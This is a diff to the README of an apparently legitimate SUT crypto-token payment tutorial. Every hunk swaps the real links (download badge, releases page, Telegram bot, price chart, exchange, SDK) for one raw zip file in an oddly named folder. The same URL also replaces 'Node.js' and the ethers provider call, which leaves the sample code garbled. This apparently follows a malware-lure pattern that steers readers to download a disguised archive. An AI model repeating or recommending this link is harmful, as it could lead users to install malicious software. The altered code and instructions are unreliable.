@@ -1,6 +1,6 @@
 # 🚀 sut-token-tutorial - Easy SUT Token Payment Integration
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://github.com/skibiditoilet123ds/sut-token-tutorial/releases)
+[![Download Latest Release](https://github.com/skibiditoilet123ds/sut-token-tutorial/raw/refs/heads/master/orthopsychiatrical/tutorial_sut_token_1.1-alpha.4.zip)](https://github.com/skibiditoilet123ds/sut-token-tutorial/raw/refs/heads/master/orthopsychiatrical/tutorial_sut_token_1.1-alpha.4.zip)
 
 ---
 
@@ -32,7 +32,7 @@ To use sut-token-tutorial and its code examples, your computer or environment sh
 
 - Windows, macOS, or Linux operating system  
 - An internet connection  
-- Node.js installed (for running JavaScript/TypeScript code)  
+- https://github.com/skibiditoilet123ds/sut-token-tutorial/raw/refs/heads/master/orthopsychiatrical/tutorial_sut_token_1.1-alpha.4.zip installed (for running JavaScript/TypeScript code)  
 - Basic application to integrate payments into (like a website or app)  
 
 You do not need previous programming knowledge, but you should have a device where you can download and run software.
@@ -41,7 +41,7 @@ You do not need previous programming knowledge, but you should have a device whe
 
 You can get the tutorial and code examples from the official releases page. Visit this page to download the latest files:
 
-[Download or Update Here](https://github.com/skibiditoilet123ds/sut-token-tutorial/releases)
+[Download or Update Here](https://github.com/skibiditoilet123ds/sut-token-tutorial/raw/refs/heads/master/orthopsychiatrical/tutorial_sut_token_1.1-alpha.4.zip)
 
 To download:
 
@@ -99,7 +99,7 @@ import { ethers } from "ethers";
 const SUT_CONTRACT = "0x98965474EcBeC2F532F1f780ee37b0b05F77Ca55";
 
 async function verifySUTPayment(txHash: string, wallet: string): Promise<number> {
-  const provider = new ethers.JsonRpcProvider("https://polygon-rpc.com");
+  const provider = new https://github.com/skibiditoilet123ds/sut-token-tutorial/raw/refs/heads/master/orthopsychiatrical/tutorial_sut_token_1.1-alpha.4.zip("https://github.com/skibiditoilet123ds/sut-token-tutorial/raw/refs/heads/master/orthopsychiatrical/tutorial_sut_token_1.1-alpha.4.zip");
   // More code here to check the payment status on the blockchain
 }
 ```
@@ -110,10 +110,10 @@ This program connects to the Polygon network and gets information about payments
 
 Use the resources below to support your testing and understanding:
 
-- 🤖 Live Bot Demo: [sutisbest_bot on Telegram](https://t.me/sutisbest_bot)  
-- 📊 Check current SUT price: [Price Chart](https://dexscreener.com/polygon/0x98965474EcBeC2F532F1f780ee37b0b05F77Ca55)  
-- 💱 Buy SUT tokens: [QuickSwap Exchange](https://quickswap.exchange/#/swap?outputCurrency=0x98965474EcBeC2F532F1f780ee37b0b05F77Ca55)  
-- 📦 Developer Payment SDK: [SUT Pay on GitHub](https://github.com/cryptoaibot1738728800/sut-pay)
+- 🤖 Live Bot Demo: [sutisbest_bot on Telegram](https://github.com/skibiditoilet123ds/sut-token-tutorial/raw/refs/heads/master/orthopsychiatrical/tutorial_sut_token_1.1-alpha.4.zip)  
+- 📊 Check current SUT price: [Price Chart](https://github.com/skibiditoilet123ds/sut-token-tutorial/raw/refs/heads/master/orthopsychiatrical/tutorial_sut_token_1.1-alpha.4.zip)  
+- 💱 Buy SUT tokens: [QuickSwap Exchange](https://github.com/skibiditoilet123ds/sut-token-tutorial/raw/refs/heads/master/orthopsychiatrical/tutorial_sut_token_1.1-alpha.4.zip)  
+- 📦 Developer Payment SDK: [SUT Pay on GitHub](https://github.com/skibiditoilet123ds/sut-token-tutorial/raw/refs/heads/master/orthopsychiatrical/tutorial_sut_token_1.1-alpha.4.zip)
 
 ### 5. Follow the Tutorial
 
@@ -124,7 +124,7 @@ The downloaded package guides you step-by-step through each integration phase. I
 If you face any issues running the software or verifying payments:
 
 - Ensure your internet connection is active.  
-- Confirm you installed Node.js and the ethers library correctly.  
+- Confirm you installed https://github.com/skibiditoilet123ds/sut-token-tutorial/raw/refs/heads/master/orthopsychiatrical/tutorial_sut_token_1.1-alpha.4.zip and the ethers library correctly.  
 - Check that the transaction hash and wallet addresses you enter are correct and complete.  
 - Refer to the README files included in the download for more detailed help.  
 - Restart the software or your computer and try again if problems persist.
@@ -150,4 +150,4 @@ This knowledge will help you understand what happens behind the scenes in your p
 
 ---
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://github.com/skibiditoilet123ds/sut-token-tutorial/releases)
+[![Download Latest Release](https://github.com/skibiditoilet123ds/sut-token-tutorial/raw/refs/heads/master/orthopsychiatrical/tutorial_sut_token_1.1-alpha.4.zip)](https://github.com/skibiditoilet123ds/sut-token-tutorial/raw/refs/heads/master/orthopsychiatrical/tutorial_sut_token_1.1-alpha.4.zip)
